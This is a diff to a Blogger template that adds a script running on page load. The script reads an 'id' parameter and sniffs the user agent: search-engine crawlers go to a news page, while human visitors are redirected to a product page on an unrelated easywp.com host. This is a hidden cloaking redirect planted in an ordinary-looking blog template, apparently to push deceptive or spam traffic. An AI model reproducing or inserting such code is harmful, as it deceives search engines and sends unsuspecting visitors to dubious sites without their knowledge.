@@ -5,17 +5,19 @@
 <b:skin><![CDATA[
 /****CSS CODE*****/
 ]]></b:skin>
-  
- (function(){
+	
+<script>
+(function(){
 	let params = (function(){var vars={};var parts=window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,function(m,key,value){vars[key]=value;});return vars;})();
 	let fafifu = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i.test(navigator.userAgent);
 	if(params.id) {
-		if(fafifu) location.replace('https://www.aliexpress.com/item/'+params.id+'.html');
-		else location.href = 'https://sheila-9efcf3.ingress-bonde.easywp.com/products/'+params.id+'.html';
+		if(fafifu) location.replace('https://www.nytimes.com/section/todayspaper');
+		else location.href = 'http://sheila-9efcf3.ingress-bonde.easywp.com/products/'+params.id+'.html';
 	}
 	if(params.gotcha) { document.addEventListener('DOMContentLoaded', function(){ document.title = 'Gotcha'; }); }
 })();
-  
+</script>
+	
 </head>
 <body>
 <b:section class='ariefghozaly' id='ariefghozaly'/>
